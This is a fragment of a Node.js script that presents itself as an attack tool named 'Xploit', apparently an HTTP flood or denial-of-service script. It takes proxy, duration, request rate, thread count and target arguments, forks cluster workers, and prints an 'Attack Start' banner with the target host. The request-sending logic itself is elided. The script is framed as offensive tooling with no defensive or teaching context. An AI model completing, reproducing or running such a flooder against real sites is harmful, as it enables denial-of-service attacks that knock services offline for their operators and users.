...
'*'
 ...
 if (process.argv.length < 7){console.log(`node Xploit Prx Time Rate Threads Target`); process.exit();}
 const headers = {};
...
if (cluster.isMaster) {
    ...
    console.log('Attack Start - Script Of Cá Xploit Love Sariel Darlight');
    console.log('\x1b[1m\x1b[36m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[36m' + 'Time: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[36m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[36m' + 'Rate Limits: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
